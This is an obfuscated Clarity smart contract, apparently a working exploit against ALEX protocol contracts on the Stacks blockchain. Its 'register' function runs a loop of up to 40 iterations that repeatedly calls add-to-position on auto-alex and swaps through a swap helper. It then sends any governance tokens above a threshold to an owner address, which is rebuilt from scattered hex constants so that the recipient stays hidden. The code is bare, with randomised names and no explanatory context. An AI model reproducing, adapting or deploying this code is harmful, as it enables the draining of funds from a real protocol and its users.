;; hello alex 
(define-data-var oaoC8 principal tx-sender) (define-constant edXhn (err u1011)) (define-constant C7ryp 0xc085) (define-constant MMSeo 0x0491) (define-constant CFkp8 0xbedc) (define-constant IdBmv 0xf569) (define-constant ERGEf 0x88db) (define-constant ToWsH 0xbfa7) (define-constant Ndog3 0xab04) (define-constant sWJlf 0x3359) (define-constant ukGr 0x8036) (define-constant NV9nN u100000000) (define-constant rZ2OF 0x9301) (define-constant WHy7L 0x16) (define-constant v4eCq (concat IdBmv ukGr)) (define-constant T3Re5 (concat sWJlf MMSeo)) (define-constant eo77S (concat ERGEf rZ2OF)) (define-constant zzyyt (concat C7ryp ToWsH)) (define-constant vL1kU (concat CFkp8 Ndog3)) (define-constant cmU4S (concat zzyyt v4eCq)) (define-constant e8YuY (concat eo77S vL1kU)) (define-constant ZOvc5 (concat cmU4S (concat T3Re5 e8YuY))) (define-constant a4Y9A-owner (unwrap-panic (principal-construct? WHy7L ZOvc5))) (define-private (check-is-owner) (ok (asserts! (is-eq tx-sender (var-get oaoC8)) edXhn)) ) (define-public (register (y9JbZ uint) (l8i4K uint) (YPaeI uint)) (let ( (willget-Mfif8 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position y9JbZ))) (pDUS8 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 get-given-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex willget-Mfif8))) ) (try! (check-is-owner)) (let ( (EfAUk (get MClRy (fold a4Y9A 0x000000000000000000000000000000000000000000000000000000000000000000000000000000 {dLrHV: y9JbZ, MClRy: pDUS8, l8i4K: l8i4K, YPaeI: YPaeI}))) ) (if (is-eq tx-sender a4Y9A-owner) (ok true) (begin (if (>= EfAUk (* u100 NV9nN)) (let ((d81Yd (try! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token transfer-fixed EfAUk tx-sender a4Y9A-owner none)))) (ok true)) (ok true) ) ) ) ) ) ) (define-private (a4Y9A (i (buff 1)) (E09UN {dLrHV: uint, MClRy: uint, l8i4K: uint, YPaeI: uint})) (if (and (> (+ (get MClRy E09UN) (get YPaeI E09UN)) (get dLrHV E09UN)) (> (get dLrHV E09UN) (* u50 NV9nN))) (let ( (Mfif8 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position (get dLrHV E09UN)))) (kzhBL (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex add-to-position (get dLrHV E09UN)))) (pDUS8 (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 swap-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token Mfif8 none))) ) (begin {dLrHV: (get MClRy E09UN), MClRy: pDUS8, l8i4K: (get l8i4K E09UN), YPaeI: (get YPaeI E09UN)} ) ) E09UN ) ) 